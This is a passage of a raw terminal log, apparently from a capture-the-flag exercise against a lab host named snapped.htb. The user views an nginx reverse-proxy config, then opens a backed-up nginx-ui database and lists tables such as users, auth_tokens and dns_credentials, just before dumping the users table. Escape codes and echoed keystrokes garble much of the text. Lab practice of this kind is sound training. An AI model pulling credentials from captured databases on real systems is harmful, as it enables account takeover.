+└─$ [?1h=[?2004hsssudo apt install python3-crypto                               nnnano nginx-uinanannonanoo o s       ssiitteessites-sites--aavvailable//nnggiinnx-ui  [?1l>[?2004l
+[?2004h(B)0[?1049h[?1h=[?1h=[?25l[ Reading... ][ Read 17 lines ]  GNU nano 8.6                                                                               sites-available/nginx-ui                                                                                        ^G Help^O Write Out     ^F Where Is^K Cut^T Execute^C LocationM-U UndoM-A Set Mark     M-] To Bracket   M-B Previous     ◂ Back^◂ Prev Word^X Exit^R Read File     ^\ Replace^U Paste^J Justify^/ Go To Line    M-E RedoM-6 Copy^B Where Was     M-F Next▸ Forward^▸ Next Wordserver {listen 80;server_name admin.snapped.htb;location / {proxy_pass http://127.0.0.1:9000;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_set_header X-Forwarded-Proto $scheme;proxy_http_version 1.1;proxy_set_header Upgrade $http_upgrade;proxy_set_header Connection "upgrade";}}[?25h[?25l[?25h[?1049l[?1l>[?2004l                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups]
+└─$ [?1h=[?2004hsssudo apt install python3-cryptosq                             sqsqlliittee e dddaattaabbaasse.db  [?1l>[?2004l
+Command 'sqlite' not found, did you mean:
+  command 'sqlite3' from deb sqlite3
+  command 'dqlite' from deb go-dqlite
+Try: sudo apt install <deb name>
+                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Downloads/backups]
+└─$ [?1h=[?2004hsqlite database.dbsqlite database.dbe3 database.dbsqlite3[?1l>[?2004l
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+[?2004hsqlite> ls
+[?2004l[?2004h   ...> dir
+[?2004l[?2004h   ...> ^C[?2004l[?2004h
+[?2004l[?2004h   ...> ;
+[?2004lParse error: near "ls": syntax error
+  ls dir  ;
+  ^--- error here
+[?2004hsqlite> SELECT * FROM *
+[?2004l[?2004h   ...> ;
+[?2004lParse error: near "*": syntax error
+  SELECT * FROM * ;
+                ^--- error here
+[?2004hsqlite> .tables
+[?2004lacme_users         configs            namespaces         sites            
+auth_tokens        dns_credentials    nginx_log_indices  streams          
+auto_backups       dns_domains        nodes              upstream_configs 
+ban_ips            external_notifies  notifications      users            
+certs              llm_sessions       passkeys         
+config_backups     migrations         site_configs     
+[?2004hsqlite> SELECT * FROM users;
